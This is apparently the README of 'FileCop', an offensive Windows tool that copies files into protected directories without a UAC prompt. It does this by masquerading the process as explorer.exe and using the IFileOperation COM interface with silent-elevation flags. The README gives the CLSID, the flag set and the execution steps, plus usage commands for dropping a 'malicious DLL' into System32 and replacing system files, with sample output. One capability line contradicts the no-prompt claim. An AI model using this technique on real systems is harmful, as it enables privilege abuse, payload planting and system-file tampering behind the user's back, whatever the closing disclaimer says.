# FileCop UAC Bypass

A Windows UAC bypass proof-of-concept that copies files to protected system directories (e.g., `C:\Windows\System32`) without triggering UAC prompts, using the `IFileOperation` COM interface with elevation flags.

## Overview

This tool demonstrates how to bypass User Account Control (UAC) to copy files into protected directories that normally require administrative privileges. The technique leverages COM automation with the `IFileOperation` interface.

### Capabilities

- Copy files to protected directories without UAC prompt  
- Works from Medium Integrity Level process  
- temporary elevation dialog shown to user  
- Silent file operations with administrator privileges  

### Protected Directories Examples
- `C:\Windows\System32`
- `C:\Program Files`
- `C:\Windows`
- Any directory requiring administrative write access

## Technical Details

### Attack Vector

The bypass exploits the `IFileOperation` COM interface combined with process masquerading:

- **CLSID**: `{3AD05575-8857-4850-9277-11B85BDB8E09}` (CLSID_FileOperation)
- **Interface**: `IFileOperation` with `FOFX_REQUIREELEVATION` flag
- **Technique**: Process rename to `explorer.exe` + Silent elevation

### Execution Flow
```
1. Process Masquerading
   └─> Rename current process to "explorer.exe" in memory

2. COM Initialization
   └─> CoCreateInstance(CLSID_FileOperation)

3. Set Elevation Flags
   └─> FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION

4. Queue File Operation
   └─> IFileOperation->CopyItem(source, destination)

5. Execute Operation
   └─> IFileOperation->PerformOperations()
   └─> File copied with elevated privileges (no UAC prompt)
```

### Key COM Flags
```cpp
FOF_NOCONFIRMATION    // Suppress user confirmation dialogs
FOFX_NOCOPYHOOKS      // Bypass copy hooks
FOFX_REQUIREELEVATION // Silently elevate the operation
```

## Requirements

- **OS**: Windows 10/11 (tested on Windows 10 1903+)
- **Privileges**: Medium Integrity Level (standard user)
- **Account**: User must be member of Administrators group
- **Compiler**: MSVC (Visual Studio 2019+) with C++20 support

## Usage

### Command Syntax
```bash
FileCop.exe  
```

### Examples
```bash
# Copy malicious DLL to System32
FileCop.exe C:\Temp\payload.dll C:\Windows\System32

# Copy executable to Program Files
FileCop.exe C:\Users\Public\tool.exe "C:\Program Files\MyApp"

# Replace system file
FileCop.exe C:\Temp\modified_notepad.exe C:\Windows\System32

# Copy to Windows directory
FileCop.exe C:\Temp\config.ini C:\Windows
```

### Output Example
```
[+] SourceFile=C:\Temp\payload.dll
[+] DestinationFile=C:\Windows\System32
[+] FileNameW=payload.dll
[+] SetOperationFlags(0x4800004) OK
[+] SHCreateItemFromParsingName(From)
[+] SHCreateItemFromParsingName(To)
[+] CopyItem() OK
[+] PerformOperations() OK
[+] Done() OK
[+] Done !
```
## Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY**

This tool is provided for:
- Educational purposes to understand Windows security mechanisms
- Authorized penetration testing in controlled environments
- Security research and vulnerability analysis
- Red team exercises with proper written authorization

⚡ Remember: With great power comes great responsibility. Use ethically.
